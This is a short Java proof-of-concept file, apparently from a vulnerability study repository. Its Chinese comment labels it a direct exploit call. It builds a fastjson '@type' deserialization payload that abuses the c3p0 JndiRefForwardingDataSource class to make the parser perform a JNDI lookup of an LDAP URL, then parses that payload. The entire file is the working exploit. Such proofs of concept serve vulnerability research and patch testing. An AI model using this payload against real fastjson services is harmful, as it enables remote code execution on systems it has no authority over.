package JNDIVul;

import com.alibaba.fastjson.JSON;

// JndiRefForwardingDataSource 类的直接 EXP 调用
public class JndiForwardingDataSourceEXP {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"," +
                "\"jndiName\":\"ldap://127.0.0.1:1230/remoteObject\",\"LoginTimeout\":\"1\"}";
        JSON.parse(payload);
    }
}
